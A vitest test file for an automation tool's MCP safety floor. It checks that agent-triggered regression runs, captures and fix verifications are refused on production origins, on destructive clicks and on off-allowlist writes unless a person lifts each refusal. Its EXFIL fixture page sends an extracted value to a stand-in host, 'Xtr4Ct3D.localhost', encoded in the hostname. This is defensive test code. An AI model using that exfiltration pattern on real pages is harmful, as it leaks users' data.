import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

// A real browser: the default new PlaywrightBrowserPort() behind `regression run` (test/browser-suites.ts reads this).
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { closeSharedBrowserPool } from "@jevitate/playwright";
import type { Journey } from "@jevitate/journey";
import { journeyReviewHash } from "./journey-review.js";
import { makeInProcessCliRunner } from "./mcp-cli-runner.js";
import { buildMcpTools } from "./mcp-api.js";
import { buildProgram } from "./program.js";

/** The MCP floor (#789) under what replays a committed regression or captures one. CLI use is the person's. */

const PAGE = (other: string): string => `<!doctype html><title>t</title><main><h1>App</h1>
<button onclick="fetch('/delete',{method:'POST'}).then(()=>{document.getElementById('o').textContent='Gone'})">Delete account</button><p id=o></p>
<button onclick="fetch('${other}/collect',{method:'POST',mode:'no-cors'}).finally(()=>{document.getElementById('o').textContent='Sent'})">Share</button>
<button onclick="fetch('/slow').then(()=>{document.getElementById('o').textContent='Slow done'})">Wait</button></main>`;
const EXFIL = `<!doctype html><title>t</title><p id=code>Xtr4Ct3D</p><button id=send onclick="fetch('http://Xtr4Ct3D.localhost:9/x',{method:'POST',mode:'no-cors'}).catch(()=>0)">Save</button>`;

let app: Server;
let other: Server;
let origin: string;
let otherOrigin: string;
let root: string;
let targetsFile: string;
const hits = { app: 0, other: 0 };
let slowStarted = false;
let releaseSlow: (() => void) | undefined;
const until = async (ready: () => boolean): Promise<void> => {
  while (!ready()) await new Promise((done) => realTimer(done, 25));
};
const realTimer = setTimeout;

const NAV = { step: { kind: "navigate", url: "/", expect: { kind: "visible", target: { role: "heading", name: "App" } } } };
const DELETE = { step: { kind: "click", target: { role: "button", name: "Delete account" }, expect: { kind: "visible", target: { text: "Gone" } } } };
const SHARE = { step: { kind: "click", target: { role: "button", name: "Share" }, expect: { kind: "visible", target: { text: "Sent" } } } };

/** A recording made on a staging instance, as an exploration there would leave it. */
const recording = (steps: readonly unknown[], site = "http://127.0.0.1:9"): unknown => ({ version: "1", site, pages: [{ url: "/", steps }] });

function seedRegression(id: string, steps: readonly unknown[], meta: Record<string, unknown> = {}): void {
  writeFileSync(join(root, `.jevitate/regressions/${id}.recording.json`), JSON.stringify(recording(steps)));
  writeFileSync(join(root, `.jevitate/regressions/${id}.meta.json`), JSON.stringify({ id, ...meta }));
}

const deps = (): never => ({ environmentsFile: join(root, ".jevitate/environments.json"), explore: { targetsConfigPath: targetsFile } }) as never;

async function regressions(args: Record<string, unknown>): Promise<{ isError: boolean; body: Record<string, unknown> }> {
  const tools = buildMcpTools({ journeysDir: join(root, ".jevitate/journeys"), pathRoots: [root], environmentsFile: join(root, ".jevitate/environments.json"), targetsConfigPath: targetsFile, runCli: makeInProcessCliRunner(() => buildProgram(deps())) } as never);
  const res = await tools.find((t) => t.name === "regressions")!.handler(args);
  return { isError: res.isError === true, body: JSON.parse(res.content[0]!.text) as Record<string, unknown> };
}

const setTargets = (byOrigin: Record<string, unknown>): void => writeFileSync(targetsFile, JSON.stringify(byOrigin));

beforeAll(async () => {
  other = createServer((req, res) => {
    if (req.method === "POST") hits.other += 1;
    res.writeHead(200, { "access-control-allow-origin": "*" });
    res.end("ok");
  });
  await new Promise<void>((done) => other.listen(0, "127.0.0.1", done));
  otherOrigin = `http://127.0.0.1:${(other.address() as AddressInfo).port}`;
  app = createServer((req, res) => {
    if (req.url === "/slow") {
      slowStarted = true;
      releaseSlow = () => {
        res.writeHead(200);
        res.end("ok");
      };
      return;
    }
    if (req.method === "POST") hits.app += 1;
    res.writeHead(200, { "content-type": "text/html" });
    res.end(req.method === "POST" ? "ok" : req.url === "/exfil" ? EXFIL : PAGE(otherOrigin));
  });
  await new Promise<void>((done) => app.listen(0, "127.0.0.1", done));
  origin = `http://127.0.0.1:${(app.address() as AddressInfo).port}`;
  root = realpathSync(mkdtempSync(join(tmpdir(), "jev-guard-replays-")));
  targetsFile = join(root, "targets.json");
  mkdirSync(join(root, ".jevitate/regressions"), { recursive: true });
  mkdirSync(join(root, ".jevitate/journeys"), { recursive: true });
  writeFileSync(join(root, ".jevitate/environments.json"), JSON.stringify({ staging: { baseUrl: origin } }));
  seedRegression("delete", [NAV, DELETE]);
  seedRegression("share", [NAV, SHARE]);
  vi.spyOn(process, "cwd").mockReturnValue(root);
});

afterAll(async () => {
  vi.restoreAllMocks();
  app.closeAllConnections();
  other.closeAllConnections();
  await Promise.all([new Promise((done) => app.close(done)), new Promise((done) => other.close(done))]);
  rmSync(root, { recursive: true, force: true });
});

beforeEach(() => {
  hits.app = 0;
  hits.other = 0;
  setTargets({});
  writeFileSync(join(root, ".jevitate/environments.json"), JSON.stringify({ staging: { baseUrl: origin } }));
});

const flagProduction = (): void => writeFileSync(join(root, ".jevitate/environments.json"), JSON.stringify({ prod: { baseUrl: origin, production: true } }));

describe("regressions run over MCP", () => {
  it("refuses a production origin named by baseUrl, before anything is sent", async () => {
    flagProduction();
    const r = await regressions({ action: "run", id: "delete", baseUrl: origin });
    expect(r.body).toMatchObject({ error: "refused", outcome: "refused", code: "E_RUN_REFUSED_PRODUCTION", retryable: false, setting: `targets.json["${origin}"].mcpRun.allowProduction` });
    expect(r.isError).toBe(true);
    expect(hits.app).toBe(0);
  });

  it("refuses a production environment named by env, before anything is sent", async () => {
    flagProduction();
    const r = await regressions({ action: "run", id: "delete", env: "prod" });
    expect(r.body).toMatchObject({ code: "E_RUN_REFUSED_PRODUCTION" });
    expect(hits.app).toBe(0);
  });

  it("refuses a destructive click, and sends nothing", async () => {
    const r = await regressions({ action: "run", id: "delete", baseUrl: origin });
    expect(r.body).toMatchObject({ error: "refused", code: "E_RUN_REFUSED_DESTRUCTIVE", rule: "builtin:destructive", at: 2, setting: `targets.json["${origin}"].mcpRun.allowDestructive` });
    expect(hits.app).toBe(0);
  });

  it("refuses a write off the run's allowlist, and it never leaves the browser", async () => {
    const r = await regressions({ action: "run", id: "share", baseUrl: origin });
    expect(r.body).toMatchObject({ code: "E_RUN_REFUSED_OFF_ALLOWLIST_WRITE", setting: `targets.json["${origin}"].mcpRun.allowOffAllowlistWrites` });
    expect(hits.other).toBe(0);
  });

  it("does not swallow the refusal in a network oracle's replay", async () => {
    seedRegression("delete-net", [NAV, DELETE], { oracle: { kind: "network", check: { kind: "requestMade", method: "POST", pathGlob: "/delete" } } });
    const r = await regressions({ action: "run", id: "delete-net", baseUrl: origin });
    expect(r.body).toMatchObject({ code: "E_RUN_REFUSED_DESTRUCTIVE" });
    expect(hits.app).toBe(0);
  });

  it("does not swallow the refusal in an invariant oracle's replay", async () => {
    seedRegression("delete-inv", [NAV, DELETE], {
      oracle: { kind: "invariant", invariantId: "no-403", invariantSpec: { invariants: [{ id: "no-403", never: { response: { url: "/api/**", status: "403" } } }] }, recordingStepIndex: 1, allowlist: [origin], baseUrl: origin, defectFingerprint: "abc" },
    });
    const r = await regressions({ action: "run", id: "delete-inv", baseUrl: origin, attempts: 3 });
    expect(r.body).toMatchObject({ code: "E_RUN_REFUSED_DESTRUCTIVE" });
    expect(hits.app).toBe(0);
  });

  it("a person lifts each refusal per target, with mcpRun", async () => {
    flagProduction();
    setTargets({ [origin]: { mcpRun: { allowProduction: true, allowDestructive: true } } });
    const r = await regressions({ action: "run", id: "delete", baseUrl: origin });
    expect(r.body).toMatchObject({ exitCode: 0, data: { verdict: "fixed" } });
    expect(hits.app).toBe(1);
  });

  it("lifts an off-allowlist write with mcpRun.allowOffAllowlistWrites", async () => {
    setTargets({ [origin]: { mcpRun: { allowOffAllowlistWrites: [otherOrigin] } } });
    const r = await regressions({ action: "run", id: "share", baseUrl: origin });
    expect(r.body).toMatchObject({ exitCode: 0, data: { verdict: "fixed" } });
    expect(hits.other).toBe(1);
  });

  it("a target's own safety.deny is not lifted by allowDestructive", async () => {
    setTargets({ [origin]: { safety: { deny: ["Share"] }, mcpRun: { allowDestructive: true, allowOffAllowlistWrites: [otherOrigin] } } });
    const r = await regressions({ action: "run", id: "share", baseUrl: origin });
    expect(r.body).toMatchObject({ code: "E_RUN_REFUSED_DESTRUCTIVE", setting: `targets.json["${origin}"].safety.deny` });
    expect(hits.other).toBe(0);
  });
});

describe("regressions capture over MCP", () => {
  const seedFrom = (name: string, steps: readonly unknown[]): string => {
    const file = join(root, `${name}.recording.json`);
    writeFileSync(file, JSON.stringify(recording(steps, origin)));
    return file;
  };

  it("refuses a recording on a production origin, before anything is sent", async () => {
    flagProduction();
    const r = await regressions({ action: "capture", id: "cap-prod", from: seedFrom("from-prod", [NAV, DELETE]) });
    expect(r.body).toMatchObject({ code: "E_RUN_REFUSED_PRODUCTION" });
    expect(hits.app).toBe(0);
  });

  it("refuses a destructive click on the way to reproducing a failure, and commits nothing", async () => {
    const r = await regressions({ action: "capture", id: "cap-del", from: seedFrom("from-del", [NAV, DELETE]) });
    expect(r.body).toMatchObject({ code: "E_RUN_REFUSED_DESTRUCTIVE", at: 2 });
    expect(hits.app).toBe(0);
  });
});

describe("a production-flagged origin in the allowlist", () => {
  const journeyTool = (id: string): Promise<{ body: Record<string, unknown> }> =>
    buildMcpTools({ journeysDir: join(root, ".jevitate/journeys"), pathRoots: [root], environmentsFile: join(root, ".jevitate/environments.json"), targetsConfigPath: targetsFile } as never)
      .find((t) => t.name === "run_journey")!
      .handler({ id })
      .then((res) => ({ body: JSON.parse(res.content[0]!.text) as Record<string, unknown> }));
  const flagOther = (): void => writeFileSync(join(root, ".jevitate/environments.json"), JSON.stringify({ stg: { baseUrl: origin }, prod: { baseUrl: otherOrigin, production: true } }));
  const seedSharing = (id: string): void => {
    const j = { metadata: { id, name: id, promoted: false, params: [], allowedOrigins: [otherOrigin], createdAtIso: "2026-11-05T00:00:00.000Z" }, recording: recording([NAV, SHARE], origin) } as never as Journey;
    j.metadata.promoted = true;
    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z", provenance: { channel: "tty", agentSignals: [] } };
    writeFileSync(join(root, `.jevitate/journeys/${id}.json`), JSON.stringify(j));
  };

  it("a write there is refused, though the allowlist names it, and never leaves the browser", async () => {
    flagOther();
    seedSharing("share-allowed");
    const r = await journeyTool("share-allowed");
    expect(r.body).toMatchObject({ outcome: "refused", code: "E_RUN_REFUSED_PRODUCTION", setting: `targets.json["${otherOrigin}"].mcpRun.allowProduction` });
    expect(hits.other).toBe(0);
  });

  it("allowOffAllowlistWrites on the site doesn't lift it either", async () => {
    flagOther();
    setTargets({ [origin]: { mcpRun: { allowOffAllowlistWrites: [otherOrigin] } } });
    const r = await regressions({ action: "run", id: "share", baseUrl: origin });
    expect(r.body).toMatchObject({ code: "E_RUN_REFUSED_PRODUCTION" });
    expect(hits.other).toBe(0);
  });

  it("mcpRun.allowProduction for that origin lifts it", async () => {
    flagOther();
    seedSharing("share-lifted");
    // 0.30.0 §5.4, changed by design: an authored allowedOrigins entry joins the write allowlist in test
    // mode only; on this automation-mode target the write there also needs the person's allowOffAllowlistWrites.
    setTargets({ [otherOrigin]: { mcpRun: { allowProduction: true } } });
    expect((await journeyTool("share-lifted")).body).toMatchObject({ code: "E_RUN_REFUSED_OFF_ALLOWLIST_WRITE" });
    expect(hits.other).toBe(0);
    setTargets({ [otherOrigin]: { mcpRun: { allowProduction: true } }, [origin]: { mcpRun: { allowOffAllowlistWrites: [otherOrigin] } } });
    expect((await journeyTool("share-lifted")).body).toMatchObject({ outcome: "ok" });
    expect(hits.other).toBe(1);
  });

  it("an allowProduction for another origin doesn't", async () => {
    flagOther();
    seedSharing("share-other-lift");
    setTargets({ [origin]: { mcpRun: { allowProduction: true } } });
    expect((await journeyTool("share-other-lift")).body).toMatchObject({ code: "E_RUN_REFUSED_PRODUCTION" });
    expect(hits.other).toBe(0);
  });
});

describe("two calls at once", () => {
  it("a refusal is its own run's: one that started a pooled browser isn't handed another's", async () => {
    await closeSharedBrowserPool();
    seedRegression("wait", [NAV, { step: { kind: "click", target: { role: "button", name: "Wait" }, expect: { kind: "visible", target: { text: "Slow done" } } } }]);
    const j = { metadata: { id: "share-now", name: "s", promoted: false, params: [], createdAtIso: "2026-11-05T00:00:00.000Z" }, recording: recording([NAV, SHARE], origin) } as never as Journey;
    j.metadata.promoted = true;
    j.metadata.approval = { contentHash: journeyReviewHash(j), at: "2026-11-05T00:00:00.000Z", provenance: { channel: "tty", agentSignals: [] } };
    writeFileSync(join(root, ".jevitate/journeys/share-now.json"), JSON.stringify(j));
    const tools = buildMcpTools({ journeysDir: join(root, ".jevitate/journeys"), pathRoots: [root], environmentsFile: join(root, ".jevitate/environments.json"), targetsConfigPath: targetsFile, runCli: makeInProcessCliRunner(() => buildProgram(deps())) } as never);
    const a = tools.find((t) => t.name === "regressions")!.handler({ action: "run", id: "wait", baseUrl: origin });
    await until(() => slowStarted);
    const b = await tools.find((t) => t.name === "run_journey")!.handler({ id: "share-now" });
    expect((JSON.parse(b.content[0]!.text) as { code: string }).code).toBe("E_RUN_REFUSED_OFF_ALLOWLIST_WRITE");
    releaseSlow?.();
    const ended = await a;
    expect(JSON.parse(ended.content[0]!.text)).toMatchObject({ exitCode: 0, data: { verdict: "fixed" } });
  });
});

describe("an extracted value, in a refusal", () => {
  it("is masked in a regression's replay too", async () => {
    seedRegression("exfil", [
      { step: { kind: "navigate", url: "/exfil", expect: { kind: "visible", target: { css: "#code" } } } },
      { step: { kind: "extract", target: { css: "#code" }, as: "code", expect: { kind: "visible", target: { css: "#code" } } } },
      { step: { kind: "click", target: { css: "#send" }, expect: { kind: "visible", target: { css: "#code" } } } },
    ]);
    const r = await regressions({ action: "run", id: "exfil", baseUrl: origin });
    expect(r.body).toMatchObject({ code: "E_RUN_REFUSED_OFF_ALLOWLIST_WRITE" });
    expect(JSON.stringify(r.body).toLowerCase()).not.toContain("xtr4ct3d");
  });
});

describe("verify_fix over MCP", () => {
  const FP = "1ad9521b771f3bd4";
  const RESULT = "explore-2026-11-05T00-00-00-000Z";
  // A markup-injection finding opens no browser, so a refusal is the only thing that could stop it reading `inconclusive`.
  const seedFinding = (allowlist: readonly string[] = [origin]): void => {
    const dir = join(root, ".jevitate/results");
    mkdirSync(dir, { recursive: true });
    writeFileSync(
      join(dir, `${RESULT}.result.json`),
      JSON.stringify({ missionOutcome: "defects-found", exitCode: 1, result: { target: { seedUrl: `${origin}/`, allowlist }, recording: { version: "1", site: origin, pages: [] }, defects: [{ fingerprint: FP, kind: "markup-injection", repro: { recordingStepIndex: 0 } }] } }),
    );
  };
  const verifyFix = async (args: Record<string, unknown> = {}, allowlist?: readonly string[]): Promise<{ isError: boolean; body: Record<string, unknown> }> => {
    seedFinding(allowlist);
    const tools = buildMcpTools({ journeysDir: join(root, ".jevitate/journeys"), recordingsDir: join(root, ".jevitate/results"), pathRoots: [root], environmentsFile: join(root, ".jevitate/environments.json"), targetsConfigPath: targetsFile } as never);
    const res = await tools.find((t) => t.name === "verify_fix")!.handler({ id: RESULT, fingerprint: FP, ...args });
    return { isError: res.isError === true, body: JSON.parse(res.content[0]!.text) as Record<string, unknown> };
  };

  it("refuses a finding on a production origin, in the floor's shape", async () => {
    flagProduction();
    const r = await verifyFix();
    expect(r.isError).toBe(true);
    expect(r.body).toMatchObject({ error: "refused", outcome: "refused", code: "E_RUN_REFUSED_PRODUCTION", retryable: false, setting: `targets.json["${origin}"].mcpRun.allowProduction` });
  });

  it("refuses a production environment's allow list, whatever the seed's origin", async () => {
    writeFileSync(join(root, ".jevitate/environments.json"), JSON.stringify({ prod: { baseUrl: otherOrigin, allow: [origin], production: true } }));
    expect((await verifyFix({ env: "prod" })).body).toMatchObject({ code: "E_RUN_REFUSED_PRODUCTION" });
  });

  it("mcpRun.allowProduction lifts it", async () => {
    flagProduction();
    setTargets({ [origin]: { mcpRun: { allowProduction: true } } });
    expect((await verifyFix()).body).toMatchObject({ status: "inconclusive" });
  });

  it("refuses a mission whose allowlist holds a production origin, and needs that origin's own allowProduction", async () => {
    const allowing = (): Promise<{ body: Record<string, unknown> }> => verifyFix({}, [origin, otherOrigin]);
    writeFileSync(join(root, ".jevitate/environments.json"), JSON.stringify({ prod: { baseUrl: otherOrigin, production: true } }));
    expect((await allowing()).body).toMatchObject({ code: "E_RUN_REFUSED_PRODUCTION", setting: `targets.json["${otherOrigin}"].mcpRun.allowProduction` });
    setTargets({ [origin]: { mcpRun: { allowProduction: true } } });
    expect((await allowing()).body).toMatchObject({ code: "E_RUN_REFUSED_PRODUCTION" });
    setTargets({ [otherOrigin]: { mcpRun: { allowProduction: true } } });
    expect((await allowing()).body).toMatchObject({ status: "inconclusive" });
  });

  it("a non-production origin replays as before", async () => {
    expect((await verifyFix()).body).toMatchObject({ status: "inconclusive" });
  });
});

describe("regression run on the CLI", () => {
  it("is unchanged: the person at the terminal is the guard", async () => {
    flagProduction();
    const out: string[] = [];
    const program = buildProgram(deps());
    program.exitOverride();
    program.configureOutput({ writeOut: (s) => void out.push(s), writeErr: () => undefined });
    for (const c of program.commands) c.configureOutput({ writeOut: (s) => void out.push(s), writeErr: () => undefined });
    const saved = process.exitCode;
    try {
      await program.parseAsync(["regression", "run", "delete", "--base-url", origin, "--json"], { from: "user" });
    } finally {
      process.exitCode = saved;
    }
    expect(hits.app).toBe(1);
  });
});
